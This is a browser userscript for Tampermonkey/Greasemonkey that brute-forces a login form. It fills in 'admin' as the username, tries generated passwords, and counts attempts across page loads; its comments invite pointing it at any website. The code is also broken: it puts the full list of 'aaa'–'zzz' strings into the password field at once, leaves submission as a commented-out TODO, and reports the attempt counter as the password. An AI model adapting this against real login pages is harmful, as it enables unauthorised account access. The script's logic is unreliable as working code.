// ==UserScript==
// @name         bruteforce test
// @namespace    https://www.sjoerdlangkemper.nl/
// @version      0.1
// @description  Bruteforce
// @author       Sjoerd Langkemper with some changes by luke
// @match        http://demo.sjoerdlangkemper.nl/login.php
// @grant        GM_setValue
// @grant        GM_getValue
// ==/UserScript==
/////////////////////
//Change @match to the website

(function() {
    'use strict';
    ///////////////////////this is for tampermonkey/greasemonkey\\\\\\\\\\\\\\\\\\\\\\\
    let usernameElem = document.getElementById('username');//set to username feild (if applicable)
    if (usernameElem) {
        usernameElem.value = 'admin';

        let passwordElem = document.getElementById('password');//The Id of the element to be bruteforced

        let counter = GM_getValue('counter', 0);//gets stored value or makes a new one equal to 0
        counter += 1;/////////////////////////////Increments by one

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        var str= 'aaa',
        s=str;
        while(str!=='zzz') {
            str= ((parseInt(str, 36)+1).toString(36)).replace(/0/g,'a');
            s+= ' '+str;
        }
        var stringed = s;
        //converts base10 counter to a word by changing base https://stackoverflow.com/questions/30685916/increment-a-string-with-letters
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        passwordElem.value = stringed;//puts attempt in password feild.

        GM_setValue('counter', counter);//store counter

        //TODO:change this to similated enter keypress||||document.getElementsByTagName('form')[0].submit();//change to tag of submit button (submits)
        console.log('attempt: ' + GM_getValue('counter'));
    } else {//if the element no longer exists aka a new page loaded
        console.log('The password is ' + GM_getValue('counter'));

        let buttonElem = document.createElement('button');///////////////
        buttonElem.innerHTML = 'restart';////////////////////////////////makes a button to restart
        buttonElem.addEventListener('click', function() {////////////////
            GM_setValue('counter', 0);///////////////////////////////////
            window.location = window.location.href;//////////////////////
        });//////////////////////////////////////////////////////////////
        document.body.appendChild(buttonElem);///////////////////////////
    }
})();
